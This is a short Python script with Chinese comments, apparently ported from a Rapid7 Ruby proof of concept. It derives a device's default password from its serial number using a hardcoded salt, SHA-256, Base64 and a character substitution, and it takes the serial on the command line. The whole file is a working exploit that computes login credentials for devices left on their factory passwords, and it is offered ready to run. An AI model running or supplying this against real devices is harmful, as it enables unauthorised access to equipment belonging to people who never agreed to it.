import sys
import hashlib
import base64
from typing import Sequence

# ──────────────────────────────────────────────────────────────
#  1. 內建查表（僅放 exploit 需要的那兩筆；其他索引保持 0/空 bytes）
# ──────────────────────────────────────────────────────────────
salt_lookup_table: list[int] = [0] * 256
salt_lookup_table[254] = 8          # index 254 → table entry 8

salt_data_table: list[bytes] = [b""] * 256
salt_data_table[8] = b"7HOLDhk'"    # 8-byte salt used by Rapid7 PoC

# ──────────────────────────────────────────────────────────────
#  2. 演算法本體（移植自原始 Ruby）
# ──────────────────────────────────────────────────────────────
def generate_default_password(
    serial: str | bytes | Sequence[int],
    salt_lookup_index: int = 254,
) -> str:
    # 取前 16 bytes 的序號
    if isinstance(serial, str):
        serial_bytes = serial.encode("ascii")[:16]
    elif isinstance(serial, bytes):
        serial_bytes = serial[:16]
    else:  # list/tuple[int]
        serial_bytes = bytes(serial[:16])

    # 透過 lookup index → salt bytes
    salt_table_index = salt_lookup_table[salt_lookup_index]
    salt_src = salt_data_table[salt_table_index]
    if len(salt_src) < 8:
        raise ValueError("salt_data_table[%d] 必須至少 8 bytes" % salt_table_index)

    # 反序並每個 -1
    salt_bytes = bytes((salt_src[::-1][i] - 1) & 0xFF for i in range(8))

    # 拼 24-byte buffer、計算 SHA-256 → Base64
    buff = serial_bytes + salt_bytes
    digest_b64 = base64.b64encode(hashlib.sha256(buff).digest()).decode()

    # 特殊字元轉換表
    trans = str.maketrans({
        "l": "#", "I": "$", "z": "%", "Z": "&",
        "b": "*", "q": "-", "O": ":", "o": "?",
        "v": "@", "y": ">",
    })
    return digest_b64[:8].translate(trans)

# ──────────────────────────────────────────────────────────────
#  3. CLI 入口
# ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    if len(sys.argv) >= 2:
        sn = sys.argv[1]
    else:
        sn = input("Serial number: ").strip()
    try:
        print(generate_default_password(sn))
    except Exception as e:
        sys.exit(f"[!] Error: {e}")